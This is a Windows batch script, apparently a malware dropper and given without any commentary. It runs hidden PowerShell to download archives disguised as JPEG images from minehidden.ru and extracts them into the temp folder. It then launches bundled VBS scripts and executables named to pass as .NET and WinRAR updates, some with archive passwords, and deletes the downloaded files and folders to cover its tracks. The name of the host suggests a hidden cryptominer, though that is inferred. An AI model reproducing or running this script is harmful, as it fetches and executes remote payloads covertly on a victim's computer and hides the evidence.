@echo OFF & powershell -WindowStyle hidden Invoke-WebRequest -URI http://minehidden.ru/assets/img/devushkaV2.jpg -outfile %temp%\devushkaV2.jpg & timeout 5 & @echo OFF & cd %temp% & tar.exe -xf devushkaV2.jpg -C %temp% & timeout 5 & start data2\winrar-x64-700b3ru.exe & start /wait data2\NETFramework.vbs & timeout 5 & start /wait data2\update.vbs & del devushkaV2.jpg & @echo OFF & timeout 8 & rd /s /q data2 & @echo OFF & timeout 5 & @echo OFF & powershell -WindowStyle hidden Invoke-WebRequest -URI http://minehidden.ru/assets/img/devushkaV.jpg -outfile %temp%\devushkaV.jpg & timeout 30 & @echo OFF & cd %temp% & tar.exe -xf devushkaV.jpg -C %temp% & timeout 10 & start /wait data\NETFramework.vbs & timeout 15 & start /wait data\update.vbs & timeout 30 & start data\winrar-x64ru.exe -pwinrar60 & @echo OFF & del devushkaV.jpg & @echo OFF & timeout 200 & del winrar-x64.exe & timeout 300 & start data\plusdcr.exe -pdc1234 & timeout 20 & rd /s /q data & del plusdc.exe & exit